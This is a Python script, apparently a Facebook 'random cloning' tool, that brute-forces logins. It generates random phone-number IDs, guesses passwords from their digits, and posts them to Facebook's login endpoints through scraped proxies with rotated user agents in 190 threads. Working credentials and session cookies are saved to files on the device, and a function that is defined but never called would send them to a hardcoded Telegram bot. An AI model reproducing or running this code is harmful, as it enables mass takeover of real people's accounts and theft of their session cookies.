#  RIYAD 

import os,json,time,uuid,sys,random,base64,shutil,re,requests,rich,gtts

from concurrent.futures import ThreadPoolExecutor as ThreadPool

from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])



try:
    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")
#━━━━━━━━[ BYPASS USER ]━━━━━━━━#
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/Xiyad404/SEX/main/FUK.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(20):
            time.sleep(0.5)
            #os.system('xdg-open https://github.com/SEFAT-MAHADI')
            print(f'\033[1;92m Tool Is Updating')
        exit()
    elif "off" in srv:
        os.system('clear')
        for j in range(20):
            time.sleep(0.5)
            #os.system('xdg-open https://github.com/MAHADI-143')
            print(f'\033[1;91m Tool is Currenty Off')
        exit()
except requests.exceptions.ConnectionError:
    print(f"\033[1;91m Connection Problem, Please Check Your Internet And Run Again")
    sys.exit()
 #━━━━━━━━[ CLOUR CODE ]━━━━━━━━#

 #━━━━━━━━[ CLOUR CODE ]━━━━━━━━#

R='\033[91;1m'
G='\033[92;1m'
g='\033[0;1m'
W='\033[1;37m'
V='\033[1;34m'
B='\033[1;30m'

user=[]
pwx=[]
oks=[]
cps=[]
uid=[]
ps=[]
ids=[]
loop=0
user=[]
pwx=[]
ugenxxx=[]
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]


for d in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','SKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,250000)
	d=random.randrange(11,19)
	e=random.randrange(73,150)
	f=random.randrange(4200,6300)
	g=random.randrange(40,250)
	random1=random.choice(['TANK2','TPC-G1011LTE','Orange Neva zen'])
	delta1=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81'
	delta2=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Vivaldi/6.6.3271.57'
	delta3=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
	delta4=f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
	delta5=f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Vivaldi/6.6.3271.57'
	uaku2 = random.choice([delta1,delta2,delta3,delta4,delta5])
	ugenxxx.append(uaku2)





try:
    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")


os.system('clear')
logo =f"""\033[1;37m
 db    db d888888b db    db  .d8b.  d8888b.   
 `8b  d8'   `88'   `8b  d8' d8' `8b 88  `8D 
  `8bd8'     88     `8bd8'  88ooo88 88   88   
  .dPYb.     88       88    88~~~88 88   88
 .8P  Y8.   .88.      88    88   88 88  .8D   
 YP    YP Y888888P    YP    YP   YP Y8888D'  
\033[1;37m-------------------------------------------
({G}+{W})  \033[1;37mOwner        \033[1;32m :  \033[92;1mX \033[1;37mI \033[92;1mY \033[1;37mA \033[92;1mD{W}
({G}+{W})  \033[1;37mFacebook     \033[1;32m :\033[1;97m  Riyad Mahfuz
({G}+{W})  \033[1;37mDeveloper    \033[1;32m :\033[1;97m  Riyad
({G}+{W})  \033[1;37mGithub       \033[1;32m :\033[1;97m  XIYAD
({G}+{W})  \033[1;37mTool Type    \033[1;32m : \033[91;1m RANDOM
{W}({G}+{W})  \033[1;37mVersion      \033[1;32m : \033[92;1m EX
\033[1;37m-------------------------------------------"""

def linex():
    print('\033[1;37m-------------------------------------------')

def cler():
    os.system('clear')
    print(logo)

def osjoin():
    os.system("clear")


def menu():
    cler()
    print(f"({G}1{W}) RANDOM")
    linex()
    xd=str(input(f"({G}+{W}) CHOICE :{G} "))
    if xd in ["01","1","A","a"]:
        time.sleep(1)
        rand()
    else:
        print(f"{R}WRONG OPTION")
        linex()
        time.sleep(1)
        menu()

def coutpass(pwx):
    j=len(pwx)+1
    if j <9:
        return "0"+str(j)
    else:
        return str(j)

def rand():
    cler()
    print(f'({G}+{W}) 0171 {G}-{W} 0191 {G}-{W} 0188 {G}-{W} 0162')
    linex()
    cod=str(input(f'({G}+{W}) Choice :{G} '))
    cler()
    print(f"({G}+{W}) 999 {G}-{W} 9999 {G}-{W} 99999")
    linex()
    limit=int(input(f"({G}+{W}) Choice :{G} "))
    linex()
    for i in range(limit):
        gd=str(random.choice(range(1000000,9999999)))
        user.append(gd)
    passli=int(input(f"({G}+{W}) Pass Limit :{G} "))
    linex()
    while True:
        print(f"({G}+{W}) first6 {G}-{W} last6 {G}-{W} first8 {G}-{W} last8")
        linex()
        pas=str(input(f"({G}+{W}) Add Pass {G}{coutpass(pwx)}{W} :{G} "))
        if "" ==pas:
            pass
        elif pas not in pwx:
            pwx.append(pas)
        linex()
        if len(pwx) >=passli:
            break
        else:
            continue
    print(f"{W}({G}1{W}) Method {G}M{W}")
    print(f"{W}({G}2{W}) Method {G}X{W}")
    print(f"{W}({G}3{W}) Method {G}P{W}")
    print(f"{W}({G}4{W}) Method {G}Touch{W}")
    print(f"{W}({G}5{W}) Method {G}Free{W}")
    print(f"{W}({G}6{W}) Method {G}Mbasic{W}")
    linex()
    mtd=str(input(f'({G}+{W}) Choice :{G} '))
    if mtd in ["1","a","A"]:
        fb="m"
    elif mtd in ["2","b","B"]:
        fb="x"
    elif mtd in ["3","c","C"]:
        fb="p"
    elif mtd in ["4","d","D"]:
        fb="touch"
    elif mtd in ["5","e","E"]:
        fb="free"
    else:
        fb="mbasic"
    with ThreadPool(max_workers=190) as xiyad:
        cler()
        print(f'{W}({G}+{W}) CODE  :{G} {cod}')
        print(f'{W}({G}+{W}) LEMIT :{G} {limit}')
        #print(f'(+) PWS   : {pas}')
        linex()
        for xd in user:
            uid=cod+xd
            xiyad.submit(rensub,uid,pwx,mtd,fb,user)

    print('')
    linex()
    print(f'({G}+{W}) {G}OK {W}IDs :{G} {str(len(oks))}')
    print(f'({G}+{W}) {R}CP {W}IDs :{R} {str(len(cps))}')
    linex()
    input(f'({G}+{W}) Inter To Back Menu');menu()


def uoa():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/537.30 (KHTML, like Gecko) Chrome/{ver}.0.3760.{ver2} Safari/535"



def rensub(uid,pwx,meth,fb,user):
    global oks,cps,loop
    ua = random.choice(ugenxxx)
    #output_string = f'\r \033[92;1mX\033[1;37mI\033[92;1mY\033[1;37mA\033[92;1mD\033[1;37m-\033[1;32mX\033[1;32mD \x1b[1;94m{loop} \033[1;37m>> \033[1;32mOK \033[1;37m>>\033[1;32m {len(oks)}\r'
    sys.stdout.write(f"\r\r  \033[92;1mX \033[1;37mI \033[92;1mY \033[1;37mA \033[92;1mD \x1b[1;94m{loop}  \033[1;32mOK\033[1;32m {str(len(oks))}  \033[1;91mCP\033[1;91m {str(len(cps))} \r");sys.stdout.flush()

    try:
        for pw in pwx:
            session=requests.Session()
            proxs= {'http': 'socks4://'+random.choice(rx)}
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get(f'https://{fb}.facebook.com').text
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={
'Host': f'{fb}.facebook.com',
'content-length': str(len(str(data))),
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': uoa(),
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVo_Z7twFKE',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{fb}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{fb}.facebook.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,proxies=proxs)
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                url_ok = f'https://graph.facebook.com/{idf}/picture?type=normal'
                res = requests.get(url_ok).text
                if 'Photoshop' in res:
                    print(f'\r{G}[OK] {idf}|{ps}')
                    print(f"\r{V}[🍪{V}]{G}{W} "+coki);print('')
                    open('/sdcard/OK.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                    oks.append(idf)
                    break
                else:
                    print(f'\r\033[0;32m[OK] {idf}|{ps}')
                    print(f"\r{V}[🍪{V}]{G}{W} "+coki);print('')
                    open('/sdcard/OK.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                    oks.append(idf)
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                #print(f'\r{B}[CP] {idf}|{ps}')
                #print(f'\r\033[0;32m[OK] {idf}|{ps}')
                #print(f"\r{V}[🍪{V}]{G}{W} "+coki);print('')
                open('/sdcard/CP.txt','a').write(idf+'|'+ps+'\n')
                cps.append(idf)
                break
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(15)


def xxxx(idf,ps,coki):
    try:
        import requests
        token = "6570882722:AAGMFeK9e9PdLWxxO6TPJKnZd2jmWbQkv1I"#Add your token 
        chatid = "6692403694"#Add your Chat Id
        OK=str(idf+"|"+ps+"|"+coki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": OK}
        requests.get(url, params=params)
    except:
        pass


menu()